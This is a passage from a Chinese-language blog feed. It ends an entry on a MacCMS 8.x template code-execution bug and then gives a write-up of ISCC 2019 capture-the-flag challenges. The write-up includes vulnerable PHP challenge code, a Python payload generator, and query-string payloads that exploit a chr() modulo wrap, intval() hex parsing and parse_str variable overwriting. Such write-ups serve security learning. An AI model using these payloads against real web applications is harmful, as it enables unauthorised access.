&apos;/&#123;if-([\s\S]*?):([\s\S]+?)&#125;([\s\S]*?)&#123;endif-\1&#125;/&apos;;</span><br><span class="line">preg_match_all($labelRule,&apos;&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;&apos;,$iar);</span><br><span class="line">print_r($iar);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($iar[0]);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($iar[1]).&apos;\n&apos;;</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($iar[2]).&apos;\n&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [0] =&gt; &#123;if-A:phpinfo()&#125;&#123;endif-A&#125; ) [1] =&gt; Array ( [0] =&gt; A ) [2] =&gt; Array ( [0] =&gt; phpinfo() ) [3] =&gt; Array ( [0] =&gt; ) ) </span><br><span class="line">Array ( [0] =&gt; &#123;if-A:phpinfo()&#125;&#123;endif-A&#125; ) </span><br><span class="line">Array ( [0] =&gt; A ) </span><br><span class="line">Array ( [0] =&gt; phpinfo() )</span><br></pre></td></tr></table></figure></p><p><a href="https://mochazz.github.io/2018/03/06/代码审计之苹果cms8.x代码执行（复现）/" target="_blank" rel="noopener">代码审计之苹果cms8.x代码执行（复现）</a></p><p><a href="http://www.cnblogs.com/test404/p/7397755.html" target="_blank" rel="noopener">Maccms8.x 命令执行漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;maccms8.x下载链接：&lt;br&gt;&lt;a href=&quot;https://share.weiyun.com/23802397ed25681ad45c112bf34cc6db&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://share.weiyun
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ISCC 2019 Write wp</title>
    <link href="http://yoursite.com/2019/05/01/iscc%202019/"/>
    <id>http://yoursite.com/2019/05/01/iscc%202019/</id>
    <published>2019-05-01T03:09:17.216Z</published>
    <updated>2019-05-27T02:07:42.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目挺简单的没怎么认真写就这些吧</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;flag.php&apos;;</span><br><span class="line">$value = $_GET[&apos;value&apos;];</span><br><span class="line">$password = $_GET[&apos;password&apos;];</span><br><span class="line">$username = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">    else $username .= chr($value[$i]);</span><br><span class="line">    if ($username == &apos;w3lc0me_To_ISCC2019&apos; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;</span><br><span class="line">        echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</span><br><span class="line">        echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><ul><li>chr()会自动取模256,所以可以在原来asccii基础上增加256</li><li>intval() 可以用十六进制绕过</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">input1 = &apos;w3lc0me_To_ISCC2019&apos;</span><br><span class="line">arr1 = []</span><br><span class="line">payload = &apos;&apos;</span><br><span class="line">for i in input1:</span><br><span class="line">    arr1.append(ord(i)+256)</span><br><span class="line"></span><br><span class="line">for x in arr1:</span><br><span class="line">    payload += (&apos;value[]=&apos; + str(x) + &apos;&amp;&apos; )</span><br><span class="line"></span><br><span class="line">print payload</span><br></pre></td></tr></table></figure><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=0x2333</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello w3lc0me_To_ISCC2019!</span><br><span class="line">flag&#123;8311873e241ccad54463eaa5d4efc1e9&#125;</span><br></pre></td></tr></table></figure><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>是个爆破三位密码题，不过有验证码</p><p>据说把cookie和验证码参数删掉就行，可能这是个后台的缺陷把</p><p>flag{996_ICU}</p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include(&quot;flag.php&quot;); </span><br><span class="line">$hashed_key = &apos;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&apos;; </span><br><span class="line">$parsed = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); </span><br><span class="line">if(isset($parsed[&quot;query&quot;]))&#123; </span><br><span class="line">    $query = $parsed[&quot;query&quot;]; </span><br><span class="line">    $parsed_query = parse_str($query); </span><br><span class="line">    if($parsed_query!=NULL)&#123; </span><br><span class="line">        $action = $parsed_query[&apos;action&apos;]; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    if($action===&quot;auth&quot;)&#123; </span><br><span class="line">        $key = $_GET[&quot;key&quot;]; </span><br><span class="line">        $hashed_input = hash(&apos;sha256&apos;, $key); </span><br><span class="line">        if($hashed_input!==$hashed_key)&#123; </span><br><span class="line">            die(&quot;&lt;img src=&apos;cxk.jpg&apos;&gt;&quot;); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        echo $flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://asimuntis.github.io/bytebandits-2019-part1/" target="_blank" rel="noopener">https://asimuntis.github.io/bytebandits-2019-part1/</a></p><p>考察变量覆盖漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parsed_query = parse_str($query);</span><br></pre></td></tr></table></figure></p><p>本地测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; $hashed_key = &apos;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&apos;;</span><br><span class="line">php &gt; $query = &apos;action=auth&amp;key=123456&apos;;</span><br><span class="line">php &gt; parse_str($query);</span><br><span class="line">php &gt; echo $action;</span><br><span class="line">auth</span><br><span class="line">php &gt; echo $key;</span><br><span class="line">123456</span><br><span class="line"></span><br><span class="line">php &gt; $query = &apos;action=auth&amp;hashed_key=97321479214621;</span><br><span class="line">php &gt; echo $hashed_key;</span><br><span class="line">97321479214621</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=auth&amp;key=test&amp;hashhed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08</span><br></pre></td></tr></table></figure></p><p>flag{7he_rea1_f1@g_15_4ere}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h3><p>题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a = [&apos;126&apos;,&apos;62&apos;,&apos;126&apos;,&apos;163&apos;,&apos;142&apos;,&apos;103&apos;,&apos;102&apos;,&apos;153&apos;,&apos;142&apos;,&apos;62&apos;,&apos;65&apos;,&apos;154&apos;,&apos;111&apos;,&apos;121&apos;,&apos;157&apos;,&apos;113&apos;,&apos;111&apos;,&apos;105&apos;,&apos;132&apos;,&apos;163&apos;,&apos;131&apos;,&apos;127&apos;,&apos;143&apos;,&apos;66&apos;,&apos;111&apos;,&apos;105&apos;,&apos;154&apos;,&apos;124&apos;,&apos;121&apos;,&apos;60&apos;,&apos;116&apos;,&apos;67&apos;,&apos;124&apos;,&apos;152&apos;,&apos;102&apos;,&apos;146&apos;,&apos;115&apos;,&apos;107&apos;,&apos;65&apos;,&apos;154&apos;,&apos;130&apos;,&apos;62&apos;,&apos;116&apos;,&apos;150&apos;,&apos;142&apos;,&apos;154&apos;,&apos;71&apos;,&apos;172&apos;,&apos;144&apos;,&apos;104&apos;,&apos;102&apos;,&apos;167&apos;,&apos;130&apos;,&apos;63&apos;,&apos;153&apos;,&apos;167&apos;,&apos;144&apos;,&apos;130&apos;,&apos;60&apos;,&apos;113&apos;]</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for x in a:</span><br><span class="line">    # print(chr(int(x,8)))</span><br><span class="line">    flag += chr(int(x,8))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>###</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;题目挺简单的没怎么认真写就这些吧&lt;/p&gt;
&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
